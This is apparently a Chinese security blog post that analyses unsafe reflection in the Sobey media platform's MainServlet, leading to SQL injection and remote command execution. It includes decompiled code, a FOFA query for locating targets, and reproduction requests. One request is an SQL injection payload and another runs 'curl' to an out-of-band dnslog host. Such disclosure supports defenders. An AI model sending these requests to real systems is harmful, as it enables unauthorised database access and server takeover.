---
title: "索贝融媒体 MainServlet 反射调用致SQL注入与命令执行漏洞"
source: https://mrxn.net/jswz/sobey-MainServlet-sqli-rce.html
asset_dir: assets/索贝融媒体-mainservlet-反射调用致sql注入与命令执行漏洞
---

# 索贝融媒体 MainServlet 反射调用致SQL注入与命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/20 10:19
- 1174浏览
- [3评论](#comment)
- 2小时阅读

深入探索

应用程序

验证

软件

---

# 漏洞简介

索贝融媒体是一款专业的媒体内容管理与发布平台，广泛应用于新闻机构的内容生产、编辑、存储和多渠道分发等业务场景。该平台的MainServlet组件存在反射调用缺陷，获得授权的攻击者可通过精心构造的请求参数触发不安全的反射调用机制，绕过输入验证和安全防护，直接执行任意SQL查询和[系统命令](https://mrxn.net/tag/rce)。此漏洞可能导致攻击者未授权访问敏感数据库信息、篡改或删除关键内容，甚至在服务器上执行任意代码，完全控制系统资源，造成严重的信息泄露、业务中断和系统安全风险。

# 影响版本

# fofa语法

> app="SOBEY-融媒体"

# 漏洞分析

先看 web.xml 里对 `MainServlet` 的定义

```
<!-- 配置框架的主Servlet -->
<servlet>
    <servlet-name>MainServlet</servlet-name>
    <servlet-class>com.sobey.cms.framework.MainServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>MainServlet</servlet-name>
    <url-pattern>/MainServlet.jsp</url-pattern>
</servlet-mapping>
```

外部通过URL路径 `MainServlet.jsp` 对`MainServlet`的访问，再看`MainServlet`的内部实现逻辑

深入探索

漏洞扫描服务

编程语言教程

安全工具开发

```
package com.sobey.cms.framework;

import com.sobey.cms.framework.data.DataCollection;
import com.sobey.cms.framework.extend.ExtendManager;
import com.sobey.cms.framework.utility.LogUtil;
import com.sobey.cms.framework.utility.StringUtil;
import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class MainServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;

    public void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            response.setHeader("Pragma", "No-Cache");
            response.setHeader("Cache-Control", "No-Cache");
            response.setDateHeader("Expires", 0L);
            response.setContentType("text/xml");
            if (Config.ServletMajorVersion == 2 && Config.ServletMinorVersion == 3) {
                response.setContentType("text/xml;charset=utf-8");
            } else {
                response.setCharacterEncoding("UTF-8");
            }

            request.setCharacterEncoding("UTF-8");
            String method = request.getParameter("_ZVING_METHOD");
            String url = request.getParameter("_ZVING_URL");
            if ("".equals(url) || "/".equals(url)) {
                url = "/Index.jsp";
            }

            if ("www.sobeycloud.com".equalsIgnoreCase(request.getServerName()) && "/demo".equalsIgnoreCase(request.getContextPath()) && !"admin".equalsIgnoreCase(User.getUserName()) && this.getServletConfig().getInitParameter(method) != null) {
                LogUtil.getLogger().warn("method:" + method + ",操作：" + this.getServletConfig().getInitParameter(method) + "此操作被拒绝!<br>系统提示：为保证索贝软件Demo站的稳定运行，Demo站中部分删除功能已被屏蔽.");
                DataCollection dcResponse = new DataCollection();
                dcResponse.put("_ZVING_STATUS", "0");
                dcResponse.put("_ZVING_MESSAGE", "此操作被拒绝!<br>系统提示：为保证索贝软件Demo站的稳定运行，Demo站中部分删除功能已被屏蔽.如需要可下载安装程序到本地来试用.<br>下载地址：<a href='http://www.sobeycloud.com/download/program/index.shtml' target='_blank'>下载SCMS</a>");
                response.getWriter().write(dcResponse.toJSON());
                return;
            }

            Current.init(request, response, method);
            if (StringUtil.isEmpty(method)) {
                LogUtil.getLogger().warn("错误的Server.sendRequest()调用，QueryString=" + request.getQueryString() + "，Referer=" + request.getHeader("referer"));
                return;
            }

            String className = method.substring(0, method.lastIndexOf("."));
            Class c = Class.forName(className);
            String LoginClass = Config.getValue("App.LoginClass");
            User.UserData user = (User.UserData)request.getSession().getAttribute("_ZVING_USER");
            if (user == null) {
                user = User.getCurrent();
            }

            if (!Ajax.class.isAssignableFrom(c) && !className.equals("com.sobey.cms.framework.Framework") && !className.equals(LoginClass) && !user.isLogin()) {
                DataCollection dcResponse = new DataCollection();
                dcResponse.put("_ZVING_SCRIPT", "window.top.location='" + Config.getContextPath() + Config.getLoginPage() + "';");
                response.getWriter().write(dcResponse.toJSON());
                return;
            }

            if (!className.equals(LoginClass) && !SessionCheck.check(c, user)) {
                DataCollection dcResponse = new DataCollection();
                dcResponse.put("_ZVING_MESSAGE", "不允许越权访问!");
                response.getWriter().write(dcResponse.toJSON());
                return;
            }

            if (ExtendManager.hasAction("BeforePageMethodInvoke")) {
                ExtendManager.executeAll("BeforePageMethodInvoke", new Object[]{method});
            }

            Current.invokeMethod(method, (Object[])null, request.getSession());
            if (ExtendManager.hasAction("AfterPageMethodInvoke")) {
                ExtendManager.executeAll("AfterPageMethodInvoke", new Object[]{method});
            }

            response.getWriter().write(Current.getResponse().toJSON());
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
```

其中关键点在下面的**Class.forName**反射调用部分

```
String className = method.substring(0, method.lastIndexOf("."));
Class c = Class.forName(className);
```

`className`提取自`_ZVING_METHOD`参数当中最后一个小数点之前的部分，如\_ZVING\_METHOD=test.xxx,那么className就等于test。

然后使用**Class.forName**来反射加载提取后的类。

接着是下面对于反射的类进行判断

```
if (!Ajax.class.isAssignableFrom(c) && !className.equals("com.sobey.cms.framework.Framework") && !className.equals(LoginClass) && !user.isLogin()) {
    DataCollection dcResponse = new DataCollection();
    dcResponse.put("_ZVING_SCRIPT", "window.top.location='" + Config.getContextPath() + Config.getLoginPage() + "';");
    response.getWriter().write(dcResponse.toJSON());
    return;
}
```

App.LoginClass来自框架的定义

```
<config name="LoginClass">com.sobey.cms.system.Login</config>
```

如果是`className`不是来自Ajax的子类或者`_ZVING_METHOD`不等于**com.sobey.cms.framework.Framework**，或者`_ZVING_METHOD`不等于`com.sobey.cms.system.Login`，亦或者没有登录，就返回`{"_ZVING_STATUS":0,"_ZVING_MESSAGE":"系统发生内部错误，操作失败:com.sobey.cms.framework.utility.CommandExecutorUtil.exec"}{"_ZVING_SCRIPT":"window.top.location='/sobey-mchEditor/Login.jsp';"}`

同时也会对当前会话的权限进行校验

```
if (!className.equals(LoginClass) && !SessionCheck.check(c, user)) {
    DataCollection dcResponse = new DataCollection();
    dcResponse.put("_ZVING_MESSAGE", "不允许越权访问!");
    response.getWriter().write(dcResponse.toJSON());
    return;
}
```

OK，自此流程分析完毕

## 命令执行-RCE

下面来看上面已经提到过的危险类`CommandExecutorUtil`，其中包含直接[执行命令](https://mrxn.net/tag/rce)的方法**exec**

```
package com.sobey.cms.framework.utility;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class CommandExecutorUtil {
    public static boolean exec(String command) {
        return exec(command, (String[])null, (String)null);
    }

    public static boolean exec(String command, String[] args, String dir) {
        try {
            LogUtil.getLogger().info("command:" + command + " args:" + args + " dir:" + dir);
            Process process = null;
            if (args == null && dir == null) {
                process = Runtime.getRuntime().exec(command);
            } else {
                process = Runtime.getRuntime().exec(command, args, new File(dir));
            }

            InputStream is1 = process.getInputStream();
            InputStream is2 = process.getErrorStream();
            BufferedReader br2 = new BufferedReader(new InputStreamReader(is2));
            StringBuffer buf = new StringBuffer();
            String line = null;

            while((line = br2.readLine()) != null) {
                buf.append(line);
            }

            LogUtil.getLogger().info("VideoUtil 输出为：" + buf);
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }
}
```

直接获取`command`参数调用`Runtime.getRuntime().exec` [执行命令](https://mrxn.net/tag/rce)，命令执行结果直接记录在日志文件里。

根据上面的命令执行类可以写一个jsp来测试

```
<%@ page language="java" import="com.sobey.cms.framework.utility.CommandExecutorUtil" pageEncoding="UTF-8"%>
<%
    // 从请求参数获取命令
    String cmd = request.getParameter("cmd");

    if (cmd != null && !cmd.trim().isEmpty()) {
        boolean result = CommandExecutorUtil.exec(cmd);
        out.println("执行命令: " + cmd + "<br>");
        out.println("执行结果: " + result);
    } else {
        out.println("请在URL中传入参数 cmd，例如：?cmd=ls");
    }
%>
```

> 该命令执行没有回显，只有成功true或者失败false

## SQL注入

如果调用`com.sobey.cms.framework.Framework` 类下面的方法如`getCodeData`方法

```
public void getCodeData() {
    String CodeType = this.Request.getString("_ZVING_CODETYPE");
    String className = Config.getValue("App.CodeSource");
    String methodName = className.substring(className.lastIndexOf(".") + 1);
    className = className.substring(0, className.lastIndexOf("."));

    try {
        Class c = Class.forName(className);
        Method m = c.getMethod(methodName, String.class, DataCollection.class);
        Object d = m.invoke((Object)null, CodeType, this.Request);
        if (d != null) {
            this.Response.put("CodeData", (DataTable)d);
        }
    } catch (Exception e) {
        e.printStackTrace();
    }

}
```

参数`_ZVING_CODETYPE`的值赋值给`CodeType`，同时友反射加载`App.CodeSource`，而`App.CodeSource` 来自

```
<config name="CodeSource">com.sobey.cms.platform.pub.PlatformCodeSource</config>
```

然后通过`c.getMethod(methodName, String.class, DataCollection.class);` 来调用其子方法

```
public class PlatformCodeSource extends CodeSource {
    public DataTable getCodeData(String codeType, Mapx params) {
        DataTable dt = null;
        String conditionField = params.getString("ConditionField");
        String conditionValue = params.getString("ConditionValue");
        if ("District".equals(codeType)) {
            QueryBuilder qb = new QueryBuilder("select code,name from ZDDistrict where " + conditionField + "=?", conditionValue);
            String parentCode = params.getString("ParentCode");
            if (StringUtil.isNotEmpty(parentCode)) {
                qb.append(" and Code like ?");
                if (!parentCode.startsWith("11") && !parentCode.startsWith("12") && !parentCode.startsWith("31") && !parentCode.startsWith("50")) {
                    if (parentCode.endsWith("0000")) {
                        qb.add(parentCode.substring(0, 2) + "%");
                        qb.append(" and TreeLevel=2");
                    } else if (parentCode.endsWith("00")) {
                        qb.add(parentCode.substring(0, 4) + "%");
                        qb.append(" and TreeLevel=3");
                    } else {
                        qb.add("#");
                    }
                } else {
                    qb.add(parentCode.substring(0, 2) + "%");
                    qb.append(" and TreeLevel=3");
                }
            } else if (conditionField.equals("1")) {
                return new DataTable();
            }

            dt = qb.executeDataTable();
        } else if ("User".equals(codeType)) {
            QueryBuilder qb = new QueryBuilder("select UserName,UserName as 'Name',RealName,isBranchAdmin from ZDUser where " + conditionField + "=?", conditionValue);
            dt = qb.executeDataTable();
        } else {
            Mapx map = CacheManager.getMapx("Code", codeType);
            if (conditionValue.equals("2")) {
                map.remove("01");
            }

            if (map != null) {
                dt = map.toDataTable();
            }
        }

        return dt;
    }
}
```

在`PlatformCodeSource`类下的`getCodeData`方法中，当`_ZVING_CODETYPE`等于`District`或`User`时，参数 `ConditionField`的值被直接接拼接进SQL语句中，无任何过滤或校验，从而导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

> 需要合法session

## SQL注入

```
GET /sobey-mchEditor/MainServlet.jsp?ConditionField=1%3d1%20OR%20SQLI_POC--%20-&ConditionValue=1&_ZVING_CODETYPE=District&_ZVING_METHOD=com.sobey.cms.framework.Framework.getCodeData HTTP/1.1
Host: sobey.mrxn.net
Cookie: JSESSIONID=xxxxxx
```

## 命令执行

```
POST /sobey-mchEditor/MainServlet.jsp?_ZVING_METHOD=com.sobey.cms.framework.utility.CommandExecutorUtil.exec HTTP/1.1
Host: sobey.mrxn.net
Cookie: JSESSIONID=xxxxx

command=curl xx.dnslog.pt
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.命令执行-RCE](#toc-4-1-)
- [4.2.SQL注入](#toc-4-2-)
- [5.漏洞复现](#toc-5-)
- [5.1.SQL注入](#toc-5-1-)
- [5.2.命令执行](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
